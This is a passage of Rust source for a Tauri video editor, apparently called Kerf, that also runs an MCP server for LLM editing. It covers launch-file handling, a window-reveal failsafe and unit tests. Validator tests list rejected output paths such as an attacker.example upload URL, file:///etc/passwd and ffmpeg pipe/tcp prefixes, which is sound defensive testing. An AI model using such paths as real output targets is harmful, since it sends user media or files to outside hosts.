/// not to ours; the first launch's is relative to ours).
fn project_arg(argv: &[String], cwd: &str) -> Option<String> {
    let arg = argv.iter().skip(1).find(|a| {
        std::path::Path::new(a)
            .extension()
            .is_some_and(|e| e.eq_ignore_ascii_case("kerf"))
    })?;
    let path = std::path::Path::new(arg);
    let full = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::path::Path::new(cwd).join(path)
    };
    Some(full.display().to_string())
}

/// What a launch's arguments ask to open. Serialized for the webview as
/// `{"open": path}` / `{"missing": path}`; `Nothing` is never sent (it is `None`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum LaunchProject {
    /// No `.kerf` argument.
    Nothing,
    /// A `.kerf` file that exists.
    Open(String),
    /// A `.kerf` argument that names nothing on disk. Not opened: SQLite would
    /// happily create it, so a mistyped path would leave an empty project file
    /// behind and open that as if it were the one meant. The webview says so
    /// instead.
    Missing(String),
}

/// What the launch with `argv` (run from `cwd`) asks to open, `exists` being the
/// filesystem question — a parameter so the parsing is testable without one.
fn launch_project(argv: &[String], cwd: &str, exists: impl Fn(&std::path::Path) -> bool) -> LaunchProject {
    match project_arg(argv, cwd) {
        None => LaunchProject::Nothing,
        Some(path) if exists(std::path::Path::new(&path)) => LaunchProject::Open(path),
        Some(path) => LaunchProject::Missing(path),
    }
}

/// This process's own launch: its arguments against its own working directory,
/// the same resolution a second launch gets (`on_second_launch`).
fn first_launch_project() -> LaunchProject {
    let argv: Vec<String> = std::env::args_os().map(|a| a.to_string_lossy().into_owned()).collect();
    let cwd = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
    launch_project(&argv, &cwd, |p| p.is_file())
}

/// Where a launch's request waits for the webview. The webview *pulls* it once its
/// listeners exist (`take`); until then a second launch's request is *held* here
/// too — emitting it to a page that is not listening yet would lose it — and the
/// newest request wins. Once the webview has asked, later requests are events.
/// One lock covers both halves, so a request is delivered exactly one way.
#[derive(Debug, Default)]
struct LaunchSlot {
    request: Option<LaunchProject>,
    /// The webview has asked, so it is listening.
    taken: bool,
}

impl LaunchSlot {
    fn new(first: LaunchProject) -> Self {
        let mut slot = Self::default();
        slot.hold(first);
        slot
    }

    fn hold(&mut self, request: LaunchProject) {
        if request != LaunchProject::Nothing {
            self.request = Some(request);
        }
    }

    /// A second launch's request. `None`: held for the webview to take. `Some`:
    /// the webview is already listening, deliver it as an event.
    fn offer(&mut self, request: LaunchProject) -> Option<LaunchProject> {
        if request == LaunchProject::Nothing {
            return None;
        }
        if self.taken {
            return Some(request);
        }
        self.hold(request);
        None
    }

    /// The webview asking: what is waiting, once. A later call (a reloaded
    /// webview) gets nothing, so a project is never reopened over the user's edits.
    fn take(&mut self) -> Option<LaunchProject> {
        self.taken = true;
        self.request.take()
    }
}

/// What the app was launched with, once — the webview calls this after its
/// listeners and the first project load are in place, then opens it the way it
/// opens a second launch's (`open-project-file`), including the question about
/// unsaved work, or says the file was not found. `None` when there was nothing,
/// or it was already taken.
#[tauri::command(async)]
fn take_launch_project(state: State<'_, AppState>) -> Option<LaunchProject> {
    state.launch.lock().unwrap_or_else(|e| e.into_inner()).take()
}

/// How long the main window may stay hidden waiting for the webview to say it is
/// ready. A normal start takes a fraction of this; it exists so a bundle that
/// crashes before it can ask (a broken build, a blocked script) cannot leave an
/// app with no window at all. A slow machine that goes over just sees the window
/// a little before it is themed, which is what every start used to look like.
const REVEAL_FAILSAFE: std::time::Duration = std::time::Duration::from_secs(3);
/// If the failsafe finds no window to show (or showing fails), how often it tries
/// again, and how many times.
const REVEAL_RETRY_EVERY: std::time::Duration = std::time::Duration::from_millis(500);
const REVEAL_RETRIES: u32 = 20;

/// Run `show` unless the window has already been revealed; says whether it ran
/// *and worked*. The webview's request and the failsafe timer both go through
/// this, so the window is shown once and the late ones are no-ops — in
/// particular a timer firing after the user has minimized the window must not
/// pop it back up. `show` says whether it actually showed something: when it did
/// not (no window yet, the platform refused) the claim is given back, so the
/// next caller tries again rather than finding a window that was never shown
/// marked as shown.
fn reveal_once(shown: &AtomicBool, show: impl FnOnce() -> bool) -> bool {
    if shown.swap(true, Ordering::AcqRel) {
        return false;
    }
    if show() {
        return true;
    }
    shown.store(false, Ordering::Release);
    false
}

/// A second launch brings the window forward every time, whatever was shown
/// before; only a show that worked counts as the reveal, so one that found no
/// window (it can arrive before the config windows exist) leaves the failsafe
/// armed.
fn bring_forward(shown: &AtomicBool, show: impl FnOnce() -> bool) -> bool {
    let worked = show();
    if worked {
        shown.store(true, Ordering::Release);
    }
    worked
}

/// Show and focus the main window; says whether there was one to show.
fn show_main(app: &AppHandle, unminimize: bool) -> bool {
    let Some(window) = app.get_webview_window("main") else {
        tracing::warn!("no main window to show (yet)");
        return false;
    };
    if unminimize {
        let _ = window.unminimize();
    }
    if let Err(e) = window.show() {
        tracing::error!(error = %e, "could not show the main window");
        return false;
    }
    let _ = window.set_focus();
    true
}

/// The webview is themed and has painted: show the main window. The window is
/// created hidden, so this is what ends the start-up. Idempotent, and a plain
/// command rather than the window API so the webview needs no `window:show`
/// permission and Rust keeps the one-shot flag.
#[tauri::command(async)]
fn show_main_window(app: AppHandle, state: State<'_, AppState>) {
    reveal_once(&state.main_window_shown, || show_main(&app, false));
}

/// Show the window after `after` if the webview has not asked by then, and keep
/// trying for a while if there is no window to show yet or showing fails.
fn spawn_reveal_failsafe(app: AppHandle, shown: Arc<AtomicBool>, after: std::time::Duration) {
    std::thread::spawn(move || {
        std::thread::sleep(after);
        for _ in 0..REVEAL_RETRIES {
            if shown.load(Ordering::Acquire) {
                return;
            }
            if reveal_once(&shown, || show_main(&app, false)) {
                tracing::warn!(secs = after.as_secs(), "the webview never showed the main window; showing it");
                return;
            }
            std::thread::sleep(REVEAL_RETRY_EVERY);
        }
        tracing::error!("gave up showing the main window");
    });
}

/// Emitted to the webview when a launch named a `.kerf` that is not there.
const MISSING_PROJECT_EVENT: &str = "launch-project-missing";

/// Tell the webview about a launch request over events (it is listening).
fn deliver_launch(app: &AppHandle, request: LaunchProject) {
    match request {
        LaunchProject::Open(path) => {
            let _ = app.emit(OPEN_PROJECT_EVENT, path);
        }
        LaunchProject::Missing(path) => {
            let _ = app.emit(MISSING_PROJECT_EVENT, path);
        }
        LaunchProject::Nothing => {}
    }
}

fn on_second_launch(app: &AppHandle, argv: Vec<String>, cwd: String) {
    tracing::info!(?argv, "second launch; focusing the running window");
    let state = app.try_state::<AppState>();
    // Someone is waiting on a window: bring it forward now, themed or not. The
    // failsafe stands down only if that really showed one — this can run before
    // the config windows exist, and then the failsafe is still what shows it.
    match &state {
        Some(state) => bring_forward(&state.main_window_shown, || show_main(app, true)),
        None => show_main(app, true),
    };
    let request = launch_project(&argv, &cwd, |p| p.is_file());
    if let LaunchProject::Missing(path) = &request {
        tracing::warn!(path, "second launch named a project file that does not exist");
    }
    // While the webview is still booting it is not listening, so the request is
    // held for it to take (newest wins); once it is, the request is an event.
    let undelivered = match &state {
        Some(state) => state.launch.lock().unwrap_or_else(|e| e.into_inner()).offer(request),
        None => Some(request),
    };
    if let Some(request) = undelivered {
        deliver_launch(app, request);
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    // Start on a fresh, empty in-memory project; the user opens an existing
    // `.kerf` file or imports media to populate it.
    let project = Arc::new(Mutex::new(Project::open_in_memory().expect("failed to create empty project")));
    // A `.kerf` on the command line of the very first launch (a second launch's is
    // forwarded by the single-instance plugin, which never reaches this far).
    let launch = first_launch_project();
    let main_window_shown = Arc::new(AtomicBool::new(false));

    tauri::Builder::default()
        // Must be the first plugin. A second launch (a `.kerf` double-clicked
        // while Kerf is open, or the binary run again) lands here instead of
        // starting another app that would fight the first for the MCP port and
        // the settings file.
        .plugin(tauri_plugin_single_instance::init(on_second_launch))
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .manage(AppState {
            project: project.clone(),
            export_cancel: Arc::new(AtomicBool::new(false)),
            analysis_cancel: Arc::new(AtomicBool::new(false)),
            levels_cancel: Arc::new(AtomicBool::new(false)),
            voiceover_cancel: Arc::new(AtomicBool::new(false)),
            main_window_shown: main_window_shown.clone(),
            launch: Mutex::new(LaunchSlot::new(launch.clone())),
        })
        .setup(move |app| {
            // Logging needs the resolved app data directory, so set it up here
            // (before anything else in setup) rather than at the top of `run`.
            init_logging(app.handle());
            install_panic_hook();
            use_bundled_ffmpeg();
            // Before anything can spawn ffmpeg: how much of the machine it may take.
            let stored = settings::load(app.handle());
            settings::apply(&stored);
            // The GPU preview builds nothing until a frame wants it; this is only the setting.
            let gpu = Arc::new(gpu_preview::GpuPreview::for_app(app.handle().clone()));
            gpu.set_enabled(stored.gpu_preview);
            app.manage(gpu);
            tracing::info!(
                version = env!("CARGO_PKG_VERSION"),
                os = std::env::consts::OS,
                arch = std::env::consts::ARCH,
                ffmpeg = %std::env::var("KERF_FFMPEG").unwrap_or_else(|_| "ffmpeg".to_string()),
                ffprobe = %std::env::var("KERF_FFPROBE").unwrap_or_else(|_| "ffprobe".to_string()),
                log_dir = %log_dir_path(app.handle()).map(|p| p.display().to_string()).unwrap_or_default(),
                data_dir = %app.path().app_data_dir().map(|p| p.display().to_string()).unwrap_or_default(),
                "kerf starting"
            );
            match &launch {
                LaunchProject::Open(path) => tracing::info!(path, "opening the project this launch was started with"),
                LaunchProject::Missing(path) => tracing::warn!(path, "this launch named a project file that does not exist"),
                LaunchProject::Nothing => {}
            }
            // The window is created hidden; if the webview never asks for it
            // (`show_main_window`), this does.
            spawn_reveal_failsafe(app.handle().clone(), main_window_shown, REVEAL_FAILSAFE);

            // The app *is* the MCP server: host the tools over HTTP, sharing the
            // same Project the GUI edits, so a connected LLM works on the open
            // project and its edits show up live.
            let handle = app.handle().clone();
            tauri::async_runtime::spawn(async move {
                if let Err(e) = mcp::serve(project, handle).await {
                    tracing::error!(error = %e, "MCP server stopped");
                }
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            list_assets,
            list_fonts,
            get_timeline,
            get_asset_metadata,
            project_path,
            new_project,
            open_project,
            save_project_as,
            import_asset,
            analyze_asset,
            transcription_status,
            set_speech_model,
            download_speech_model,
            voiceover_status,
            prepare_voiceover,
            generate_voiceover,
            cancel_voiceover,
            get_ripple_mode,
            set_ripple_mode,
            cut_clip,
            add_clip,
            split_clip,
            trim_clip,
            reorder_clip,
            move_clip,
            move_clips,
            ripple_delete,
            cut_clip_range,
            roll_edit,
            slip_clip,
            slide_clip,
            split_remove,
            split_remove_clips,
            add_track,
            remove_track,
            set_track_duck,
            set_track_volume,
            set_track_pan,
            set_master_volume,
            set_master_limiter,
            get_levels,
            cancel_levels,
            set_delivery_format,
            set_track_muted,
            set_track_solo,
            set_track_locked,
            set_clip_enabled,
            duplicate_clips,
            insert_clips,
            remove_clip,
            remove_clips,
            set_volume,
            set_fade,
            set_speed,
            set_transform,
            set_color,
            set_transition,
            set_mask,
            set_video_effects,
            set_audio_effects,
            set_keyframes,
            add_keyframe,
            set_keyframe_easing,
            clear_keyframes,
            set_reframe,
            set_asset_projection,
            clear_reframe,
            set_reframe_keyframes,
            add_reframe_keyframe,
            add_marker,
            update_marker,
            remove_marker,
            add_overlay,
            update_overlay,
            remove_overlay,
            set_overlay_keyframes,
            generate_captions,
            clear_captions,
            import_captions,
            import_captions_text,
            export_srt,
            remove_silence,
            snap_to_beats,
            smart_crop,
            extract_audio,
            add_asset_audio,
            detach_audio,
            detach_audio_clips,
            reattach_audio,
            reattach_audio_clips,
            link_clips,
            unlink_clips,
            concatenate,
            get_history,
            revision_diff,
            get_staged_edit,
            get_staged_timeline,
            apply_staged_edit,
            discard_staged_edit,
            undo,
            redo,
            revert_to,
            get_frame,
            get_timeline_frame,
            get_preview_frame,
            set_preview_bounds,
            gpu_preview_status,
            start_playback,
            stop_playback,
            get_waveform,
            get_waveform_range,
            get_filmstrip,
            get_audio,
            get_energy,
            list_tasks,
            add_task,
            resolve_task,
            remove_task,
            hw_encoders,
            export_timeline,
            export_variants,
            cancel_export,
            cancel_analysis,
            export_cover,
            platform_targets,
            platform_check,
            reveal_path,
            mcp_endpoint,
            agent_status,
            get_settings,
            set_settings,
            read_text_file,
            write_text_file,
            log_dir,
            reveal_logs,
            log_frontend,
            show_main_window,
            take_launch_project
        ])
        .build(tauri::generate_context!())
        .expect("error while building Kerf")
        .run(|_app, event| {
            // The logfile's last line then says whether the end was a clean exit
            // or a crash.
            if let tauri::RunEvent::Exit = event {
                tracing::info!("kerf exiting");
            }
        });
}

#[cfg(test)]
mod tests {
    use super::{
        bring_forward, file_appender, file_layer, filmstrip_payload, launch_project, log_panic, panic_summary, project_arg,
        require_json_path, require_local_output_path, reveal_once, truncate_log, LaunchProject, LaunchSlot, LogBudget,
        FRONTEND_LOG_PER_SEC, REVEAL_FAILSAFE,
    };
    use base64::Engine as _;
    use kerf_core::{Filmstrip, FilmstripSheet};
    use std::path::{Path, PathBuf};
    use std::sync::atomic::{AtomicBool, Ordering};
    use tracing_subscriber::prelude::*;

    /// A fresh directory under the system temp dir, removed when dropped.
    struct Scratch(PathBuf);

    impl Scratch {
        fn new(tag: &str) -> Self {
            let nanos = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map_or(0, |d| d.as_nanos());
            let dir = std::env::temp_dir().join(format!("kerf-app-{tag}-{}-{nanos}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            Scratch(dir)
        }

        /// Every logfile in the directory, concatenated.
        fn logs(&self) -> String {
            let mut text = String::new();
            for entry in std::fs::read_dir(&self.0).unwrap() {
                text.push_str(&std::fs::read_to_string(entry.unwrap().path()).unwrap());
            }
            text
        }
    }

    impl Drop for Scratch {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn argv(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn truncate_log_keeps_short_and_cuts_on_a_char_boundary() {
        assert_eq!(truncate_log("short", 10), "short");
        let cut = truncate_log("aéééé", 4);
        assert!(cut.starts_with("aé…"), "{cut}");
        assert!(cut.contains("truncated"));
    }

    #[test]
    fn log_budget_caps_a_second_and_reports_the_drops_next_window() {
        let mut b = LogBudget::default();
        for _ in 0..FRONTEND_LOG_PER_SEC {
            assert_eq!(b.admit(5_000), (true, 0));
        }
        assert_eq!(b.admit(5_500), (false, 0));
        assert_eq!(b.admit(5_900), (false, 0));
        assert_eq!(b.admit(6_100), (true, 2));
    }

    #[test]
    fn accepts_absolute_local_paths() {
        assert!(require_local_output_path("/home/user/out.mp4").is_ok());
        assert!(require_local_output_path("C:\\Users\\me\\out.mp4").is_ok());
        assert!(require_local_output_path("c:/Users/me/out.mp4").is_ok());
        assert!(require_local_output_path("\\\\server\\share\\out.mp4").is_ok());
    }

    #[test]
    fn rejects_relative_paths() {
        assert!(require_local_output_path("out.mp4").is_err());
        assert!(require_local_output_path("renders/out.mp4").is_err());
        assert!(require_local_output_path("Users\\me\\out.mp4").is_err());
    }

    #[test]
    fn rejects_protocol_urls() {
        for bad in [
            "rtmp://example.com/live",
            "https://attacker.example/upload",
            "http://127.0.0.1:8080/x",
            "udp://239.0.0.1:1234",
            "file:///etc/passwd",
        ] {
            assert!(require_local_output_path(bad).is_err(), "{bad} should be rejected");
        }
    }

    #[test]
    fn rejects_bare_ffmpeg_protocol_prefixes() {
        for bad in ["pipe:1", "pipe:", "concat:a.mp4|b.mp4", "async:tcp://host:1234"] {
            assert!(require_local_output_path(bad).is_err(), "{bad} should be rejected");
        }
    }

    #[test]
    fn windows_drive_letter_is_not_a_protocol() {
        // A lone drive letter followed by a path separator must never be
        // mistaken for a scheme — this is the whole reason the check isn't
        // just "contains a colon".
        assert!(require_local_output_path("D:\\video\\clip.mov").is_ok());
    }

    #[test]
    fn a_second_launch_forwards_only_a_kerf_path() {
        assert_eq!(project_arg(&argv(&["kerf"]), "/home/u"), None);
        assert_eq!(project_arg(&argv(&["kerf", "--flag", "notes.txt"]), "/home/u"), None);
        assert_eq!(
            project_arg(&argv(&["kerf", "/data/cut.kerf"]), "/home/u").as_deref(),
            Some("/data/cut.kerf")
        );
        assert_eq!(
            project_arg(&argv(&["kerf", "CUT.KERF"]), "/home/u").map(|p| p.replace('\\', "/")),
            Some("/home/u/CUT.KERF".to_string())
        );
        // argv[0] is the binary, never a project.
        assert_eq!(project_arg(&argv(&["/opt/x.kerf"]), "/home/u"), None);
    }

    #[test]
    fn a_filmstrip_reaches_the_webview_as_geometry_plus_a_data_url_per_sheet() {
        let first: Vec<u8> = vec![0xFF, 0xD8, 0xFF, 0xD9];
        let second: Vec<u8> = vec![0xFF, 0xD8, 0xFF, 0xD9, 0x00];
        let strip = Filmstrip {
            interval: 0.5,
            frame_width: 170,
            frame_height: 96,
            frames: 3,
            columns: 2,
            sheets: vec![
                FilmstripSheet {
                    first_frame: 0,
                    count: 2,
                    width: 340,
                    height: 96,
                    jpeg: first.clone().into(),
                },
                FilmstripSheet {
                    first_frame: 2,
                    count: 1,
                    width: 340,
                    height: 96,
                    jpeg: second.clone().into(),
                },
            ],
        };
        let json = serde_json::to_value(filmstrip_payload(&strip)).unwrap();

        // The geometry is core's own serialization, unchanged...
        let mut core = serde_json::to_value(&strip).unwrap();
        for (sheet, core_sheet) in json["sheets"]
            .as_array()
            .unwrap()
            .iter()
            .zip(core["sheets"].as_array_mut().unwrap())
        {
            // ...and each sheet is core's sheet plus exactly one key, `data_url`.
            let mut sheet = sheet.clone();
            let url = sheet.as_object_mut().unwrap().remove("data_url").unwrap();
            assert_eq!(&sheet, core_sheet);
            assert!(url.as_str().unwrap().starts_with("data:image/jpeg;base64,"), "{url}");
        }
        for key in ["interval", "frame_width", "frame_height", "frames", "columns"] {
            assert_eq!(json[key], core[key], "{key}");
        }
        assert_eq!(json.as_object().unwrap().len(), 6, "geometry plus the sheets, nothing else");

        // ...and the URL is the sheet's own bytes, base64.
        let decode = |sheet: &serde_json::Value| {
            let url = sheet["data_url"].as_str().unwrap();
            base64::engine::general_purpose::STANDARD
                .decode(url.strip_prefix("data:image/jpeg;base64,").unwrap())
                .unwrap()
        };
        assert_eq!(decode(&json["sheets"][0]), first);
        assert_eq!(decode(&json["sheets"][1]), second);
        assert_eq!(json["sheets"][0]["data_url"], "data:image/jpeg;base64,/9j/2Q==");
        assert_eq!(json["sheets"][0]["first_frame"], 0);
        assert_eq!(json["sheets"][1]["first_frame"], 2);
    }

    #[test]
    fn text_file_commands_only_take_json() {
        assert!(require_json_path("/t/dark.kerf-theme.json").is_ok());
        assert!(require_json_path("C:\\t\\THEME.JSON").is_ok());
        assert!(require_json_path("/home/u/.bashrc").is_err());
        assert!(require_json_path("/t/theme.json.exe").is_err());
    }

    #[test]
    fn the_first_launch_opens_the_kerf_it_was_given() {
        let there = |_: &Path| true;
        let nowhere = |_: &Path| false;

        assert_eq!(launch_project(&argv(&["kerf"]), "/home/u", there), LaunchProject::Nothing);
        assert_eq!(
            launch_project(&argv(&["kerf", "--flag", "notes.txt"]), "/home/u", there),
            LaunchProject::Nothing
        );
        // An absolute path stands as it is, whatever the working directory is.
        assert_eq!(
            launch_project(&argv(&["kerf", "/data/cut.kerf"]), "/home/u", there),
            LaunchProject::Open("/data/cut.kerf".to_string())
        );
        // A relative one is relative to the directory the app was started from.
        let LaunchProject::Open(relative) = launch_project(&argv(&["kerf", "cut.kerf"]), "/home/u", there) else {
            panic!("a relative .kerf should open");
        };
        assert_eq!(relative.replace('\\', "/"), "/home/u/cut.kerf");
        // Other arguments around it do not matter; the first .kerf wins.
        assert_eq!(
            launch_project(&argv(&["kerf", "--x", "/a.kerf", "/b.kerf"]), "/", there),
            LaunchProject::Open("/a.kerf".to_string())
        );
        // argv[0] is the binary, never a project.
        assert_eq!(
            launch_project(&argv(&["/opt/x.kerf"]), "/home/u", there),
            LaunchProject::Nothing
        );
        // No working directory (it was deleted under us) leaves a relative path as typed.
        assert_eq!(
            launch_project(&argv(&["kerf", "cut.kerf"]), "", there),
            LaunchProject::Open("cut.kerf".to_string())
        );
        // A path that is not there is reported, not opened: opening it would create it.
        assert_eq!(
            launch_project(&argv(&["kerf", "/data/typo.kerf"]), "/home/u", nowhere),
            LaunchProject::Missing("/data/typo.kerf".to_string())
        );
    }

    #[test]
    fn a_launch_is_judged_against_the_real_filesystem_too() {
        let scratch = Scratch::new("launch");
        let real = scratch.0.join("real.kerf");
        std::fs::write(&real, b"").unwrap();
        let dir = scratch.0.display().to_string();
        let is_file = |p: &Path| p.is_file();

        assert_eq!(
            launch_project(&argv(&["kerf", "real.kerf"]), &dir, is_file),
            LaunchProject::Open(real.display().to_string())
        );
        assert!(matches!(
            launch_project(&argv(&["kerf", "gone.kerf"]), &dir, is_file),
            LaunchProject::Missing(_)
        ));
        // A directory that happens to be named like a project is not one.
        std::fs::create_dir(scratch.0.join("folder.kerf")).unwrap();
        assert!(matches!(
            launch_project(&argv(&["kerf", "folder.kerf"]), &dir, is_file),
            LaunchProject::Missing(_)
        ));
    }

    #[test]
    fn the_launch_request_is_handed_over_once() {
        let open = |p: &str| LaunchProject::Open(p.to_string());
        let mut slot = LaunchSlot::new(open("/data/cut.kerf"));
        assert_eq!(slot.take(), Some(open("/data/cut.kerf")));
        // A reloaded webview asking again must not reopen it over the user's edits.
        assert_eq!(slot.take(), None);
        assert_eq!(LaunchSlot::new(LaunchProject::Nothing).take(), None);
        // A missing file is a request too: the webview says so.
        let mut slot = LaunchSlot::new(LaunchProject::Missing("/x.kerf".to_string()));
        assert_eq!(slot.take(), Some(LaunchProject::Missing("/x.kerf".to_string())));
    }

    #[test]
    fn a_second_launch_while_the_webview_boots_is_held_not_emitted() {
        let open = |p: &str| LaunchProject::Open(p.to_string());
        // The first launch carried nothing, and a second arrives before the page is
        // listening: an event now would be lost, so the slot holds it.
        let mut slot = LaunchSlot::new(LaunchProject::Nothing);
        assert_eq!(slot.offer(open("/a.kerf")), None);
        assert_eq!(slot.take(), Some(open("/a.kerf")));

        // Newest wins over what the first launch asked for, and over an earlier second.
        let mut slot = LaunchSlot::new(open("/first.kerf"));
        assert_eq!(slot.offer(open("/second.kerf")), None);
        assert_eq!(slot.offer(open("/third.kerf")), None);
        assert_eq!(slot.take(), Some(open("/third.kerf")));

        // Once the webview has asked it is listening, so a later one is an event.
        assert_eq!(slot.offer(open("/late.kerf")), Some(open("/late.kerf")));
        assert_eq!(slot.take(), None, "an event-delivered request is not also held");

        // A second launch with no project argument asks for nothing, either way.
        let mut slot = LaunchSlot::new(open("/first.kerf"));
        assert_eq!(slot.offer(LaunchProject::Nothing), None);
        assert_eq!(slot.take(), Some(open("/first.kerf")), "and does not clobber what is waiting");
        assert_eq!(slot.offer(LaunchProject::Nothing), None);
    }

    #[test]
    fn a_missing_file_reaches_the_webview_as_a_variant_it_can_name() {
        let json = |p: LaunchProject| serde_json::to_value(p).unwrap();
        assert_eq!(
            json(LaunchProject::Open("/a.kerf".into())),
            serde_json::json!({ "open": "/a.kerf" })
        );
        assert_eq!(
            json(LaunchProject::Missing("/b.kerf".into())),
            serde_json::json!({ "missing": "/b.kerf" })
        );
    }

    #[test]
    fn the_window_is_revealed_once_whoever_asks_first() {
        let shown = AtomicBool::new(false);
        let mut calls = 0;
        // The webview asks, then the failsafe timer fires: only the first shows it.
        assert!(reveal_once(&shown, || {
            calls += 1;
            true
        }));
        assert!(!reveal_once(&shown, || {
            calls += 1;
            true
        }));
        assert!(!reveal_once(&shown, || {
            calls += 1;
            true
        }));
        assert_eq!(calls, 1);
        assert!(shown.load(Ordering::Acquire));
    }

    #[test]
    fn a_reveal_that_showed_nothing_is_not_counted() {
        // No window yet (or the platform refused): the claim is given back, so the
        // next caller — the failsafe's retry — still gets to try.
        let shown = AtomicBool::new(false);
        assert!(!reveal_once(&shown, || false));
        assert!(!shown.load(Ordering::Acquire));
        assert!(reveal_once(&shown, || true));
        assert!(shown.load(Ordering::Acquire));
        assert!(!reveal_once(&shown, || panic!("already shown")));
    }

    #[test]
    fn a_second_launch_before_the_window_exists_leaves_the_failsafe_armed() {
        let shown = AtomicBool::new(false);
        // The single-instance callback can run before the config windows exist.
        assert!(!bring_forward(&shown, || false));
        assert!(
            !shown.load(Ordering::Acquire),
            "nothing was shown, so the failsafe must still fire"
        );
        assert!(bring_forward(&shown, || true));
        assert!(shown.load(Ordering::Acquire));
        // It brings the window forward every time, whatever was shown before.
        let mut forward = 0;
        assert!(bring_forward(&shown, || {
            forward += 1;
            true
        }));
        assert_eq!(forward, 1);
    }

    #[test]
    fn the_failsafe_is_short_enough_to_notice_and_long_enough_to_boot() {
        assert!(REVEAL_FAILSAFE >= std::time::Duration::from_secs(2));
        assert!(REVEAL_FAILSAFE <= std::time::Duration::from_secs(10));
    }

    #[test]
    fn the_main_window_starts_hidden_in_every_build() {
        let conf: serde_json::Value = serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let windows = conf["app"]["windows"].as_array().unwrap();
        let main = windows.iter().find(|w| w["label"] == "main").expect("a main window");
        assert_eq!(main["visible"], false, "the main window must be created hidden");
        // Hidden shows the window's own backdrop in the moment before the page paints.
        assert!(main["backgroundColor"].as_str().is_some_and(|c| c.starts_with('#')));

        // The debug identity is merged over this file (build.rs); it may change who the
        // app *is* but must not bring a window of its own, or a dev build would show
        // the window the release one hides.
        let dev: serde_json::Value = serde_json::from_str(include_str!("../tauri.dev.conf.json")).unwrap();
        assert!(dev.get("app").is_none(), "tauri.dev.conf.json must not override app.windows");

        // Showing goes through the `show_main_window` command, so the webview needs no
        // window permission for it; granting one would be a needless widening.
        let caps = include_str!("../capabilities/default.json");
        assert!(
            !caps.contains("window:allow-show"),
            "show_main_window makes this permission unnecessary"
        );
    }

    #[test]
    fn a_panic_message_and_place_are_read_from_either_payload_type() {
        let place = std::panic::Location::caller();
        let (loc, msg) = panic_summary(Some(place), &"literal");
        assert_eq!(msg, "literal");
        assert!(loc.contains("lib.rs:"), "{loc}");
        assert_eq!(
            panic_summary(None, &"formatted".to_string()),
            (String::new(), "formatted".to_string())
        );
        assert_eq!(panic_summary(None, &42_u32).1, "panic");
    }

    #[test]
    fn a_panic_is_in_the_logfile_the_moment_it_is_logged() {
        let scratch = Scratch::new("panic");
        let subscriber = tracing_subscriber::registry().with(file_layer(file_appender(&scratch.0).unwrap()));
        tracing::subscriber::with_default(subscriber, || {
            let (location, message) = panic_summary(Some(std::panic::Location::caller()), &"boom");
            log_panic(&location, &message, &"frame 0\nframe 1");
        });
        // No guard dropped, no sleep, no flush: the file already has it. (Behind
        // `tracing_appender::non_blocking` this read races a worker thread.)
        let logs = scratch.logs();
        assert!(logs.contains("ERROR"), "{logs}");
        assert!(logs.contains("panic: boom"), "{logs}");
        assert!(logs.contains("frame 1"), "the backtrace is part of the line: {logs}");
        assert!(logs.contains("lib.rs:"), "{logs}");
    }

    #[test]
    fn a_line_is_on_disk_the_moment_logging_returns() {
        // The property a crash relies on, checked without needing one: when a
        // `tracing` call returns, its line is already in the file — nothing is
        // queued for a worker to write later. Read straight back after each line,
        // many times over: behind `tracing_appender::non_blocking` the worker has
        // to be woken first, so the read misses it most of the time and a few
        // dozen tries make that all but certain.
        let scratch = Scratch::new("sync");
        let subscriber = tracing_subscriber::registry().with(file_layer(file_appender(&scratch.0).unwrap()));
        tracing::subscriber::with_default(subscriber, || {
            for i in 0..40 {
                tracing::info!(i, "line");
                let logs = scratch.logs();
                assert!(
                    logs.contains(&format!("i={i} ")) || logs.contains(&format!("i={i}\n")),
                    "line {i} is not on disk yet:\n{logs}"
                );
            }
        });
    }

    /// A process that logs and then dies without unwinding leaves its lines in
    /// the file. The "crash" is a child process (this test binary, re-run on just
    /// this test) that calls `process::exit(1)` straight after a burst of logging:
    /// no destructors run, so anything held in a buffer is gone. That is what this
    /// catches (a `BufWriter` around the appender, say). It does *not* reliably
    /// catch a queue-backed writer — `exit` takes long enough for that worker to
    /// drain — which is `a_line_is_on_disk_the_moment_logging_returns`'s job.
    /// (`abort()` would model a crash more literally, but raises the OS's crash
    /// reporter — apport, WER, ReportCrash — on a developer's machine.)
    #[test]
    fn the_last_lines_survive_a_hard_crash() {
        const CHILD_DIR: &str = "KERF_TEST_LOG_CRASH_DIR";
        const BURST: u32 = 2000;
        if let Some(dir) = std::env::var_os(CHILD_DIR) {
            tracing_subscriber::registry()
                .with(file_layer(file_appender(Path::new(&dir)).unwrap()))
                .init();
            tracing::info!("starting");
            // A burst, so a queue-backed writer is behind when the end comes.
            for i in 0..BURST {
                tracing::info!(i, "burst");
            }
            tracing::error!("last words before the crash");
            std::process::exit(1);
        }

        let scratch = Scratch::new("crash");
        let child = std::process::Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "tests::the_last_lines_survive_a_hard_crash",
                "--test-threads=1",
                "--nocapture",
            ])
            .env(CHILD_DIR, &scratch.0)
            .output()
            .unwrap();
        assert_eq!(
            child.status.code(),
            Some(1),
            "the child should have died at its exit(1), not finished the test: {}{}",
            String::from_utf8_lossy(&child.stdout),
            String::from_utf8_lossy(&child.stderr)
        );
        let logs = scratch.logs();
        assert!(logs.contains("starting"), "{logs}");
        assert_eq!(
            logs.lines().filter(|l| l.contains("burst")).count(),
            BURST as usize,
            "every line logged before the crash is in the file"
        );
        assert!(
            logs.contains("last words before the crash"),
            "the very last line is in the file"
        );
    }
}
